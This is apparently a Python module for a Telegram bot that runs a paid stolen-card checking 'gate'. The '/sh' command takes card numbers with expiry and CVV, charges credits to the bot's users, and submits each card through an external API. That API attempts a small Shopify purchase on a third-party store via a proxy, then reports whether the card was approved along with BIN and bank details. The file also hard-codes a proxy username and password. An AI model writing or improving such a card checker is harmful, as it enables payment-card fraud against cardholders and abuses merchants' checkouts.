import aiohttp
import asyncio
import time
from telegram import Update
from telegram.ext import CommandHandler, ContextTypes
from config import get_bin_info, kb_result
from plans import deduct_credit

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🦇 NEW SHOPIFY API CONFIGURATION 🦇
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SH_NEW_API = "https://autosh.up.railway.app/shopii"
SH_SITE = "https://powerbuild.store"
SH_PROXY = "http://purevpn0s12153504:1LTpwxbCJbEdXo@px041202.pointtoserver.com:10780"
GATE_NAME = "SHOPIFY | 1$"

async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.bot_data.get('sh_on', True):
        await update.message.reply_text("⚠️ Gᴀᴛᴇ ➤ OFF", parse_mode="HTML")
        return
    
    card = None
    if context.args: 
        card = context.args[0]
    elif update.message.reply_to_message and update.message.reply_to_message.text: 
        card = update.message.reply_to_message.text.strip()
        
    if not card:
        # Exact requested warning text without "❌ Usage" or "Example"
        await update.message.reply_text(
            "⚠️ Uꜱᴀɢᴇ: Rᴇᴍʟʏ ᴛᴏ ᴀ ᴍᴇꜱꜱᴀɢᴇ ᴡɪᴛʜ ᴄᴀʀᴅꜱ ᴏʀ ꜱᴇɴᴅ\n/sh cc|mm|yy|cvv", 
            parse_mode="HTML"
        )
        return
    
    if not deduct_credit(update.effective_user.id):
        await update.message.reply_text("Buy the PLANS and Start the checking you trils cradits are empty.", parse_mode="HTML")
        return
    
    bin_num = card[:6]
    msg = await update.message.reply_text("⏳ Pʀᴏᴄᴇꜱꜱɪɴɢ...", parse_mode="HTML")
    start_time = time.time()
    
    try:
        timeout = aiohttp.ClientTimeout(total=120)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            # Fetching new API and BIN info concurrently
            tasks = [
                session.get(SH_NEW_API, params={"cc": card, "site": SH_SITE, "proxy": SH_PROXY}), 
                get_bin_info(bin_num)
            ]
            results = await asyncio.gather(*tasks, return_exceptions=True)
        
        api_resp = results[0]
        bin_data = results[1] if not isinstance(results[1], Exception) else {"error": True}
        
        if isinstance(api_resp, Exception): raise api_resp
        
        data = await api_resp.json()
        
        # Extracting exact new JSON response fields
        gateway = data.get("Gateway", "N/A")
        price = data.get("Price", "N/A")
        proxy_status = data.get("Proxy", "N/A")
        response = data.get("Response", "ERROR")
        status = data.get("Status", "false")
        cc_used = data.get("CC", card)
        
        # Determine if approved based on new API "Status" field
        approved = str(status).lower() == "true" or "approved" in str(response).lower()
        icon = "✅" if approved else "❌"
        result_text = "APPROVED ✅" if approved else "DECLINED ❌"
        
        # Get BIN Info
        bin_txt, country, flag = "N/A", "N/A", ""
        if not bin_data.get("error"):
            s = str(bin_data.get("scheme", "N/A")).upper()
            t = str(bin_data.get("type", "N/A")).upper()
            b = bin_data.get("bank", "N/A")
            country = str(bin_data.get("country", "N/A")).upper()
            flag = bin_data.get("country_emoji", "")
            bin_txt = f"{s} - {t} - {b}"
            
        time_taken = f"{time.time() - start_time:.2f}"
        u = update.effective_user.username or update.effective_user.first_name
        
        # Exact New UI Design mapped to JSON response
        text = (
            f"{icon} {GATE_NAME} ➛ {result_text}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"💳 𝗖𝗔𝗥𝗗 ➺ <code>{cc_used}</code>\n"
            f"🌐 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ➺ {gateway}\n"
            f"💰 𝗣𝗥𝗜𝗖𝗘 ➺ ${price}\n"
            f"🔒 𝗣𝗥𝗢𝗫𝗬 ➺ {proxy_status}\n"
            f"📜 𝗥𝗘𝗦𝗣 ➺ {response}\n"
            f"⏱️ 𝗧𝗜𝗠𝗘 ➺ {time_taken}s\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🏦 𝗕𝗜𝗡 ➺ {bin_txt}\n"
            f"🌍 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 ➺ {flag} {country}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🦇 𝗨𝘀𝗘𝗥 ➺ {u}"
        )
        
        await msg.edit_text(
            text, 
            parse_mode="HTML", 
            reply_markup=kb_result(), 
            disable_web_page_preview=True
        )
        
    except aiohttp.ClientTimeout: 
        await msg.edit_text("⏳ Tɪᴍᴇᴏᴜᴛ", parse_mode="HTML")
    except Exception as e: 
        await msg.edit_text(f"❌ Eʀʀᴏʀ ➤ <code>{str(e)[:100]}</code>", parse_mode="HTML")

def get_sh_handler():
    return CommandHandler("sh", cmd_sh)
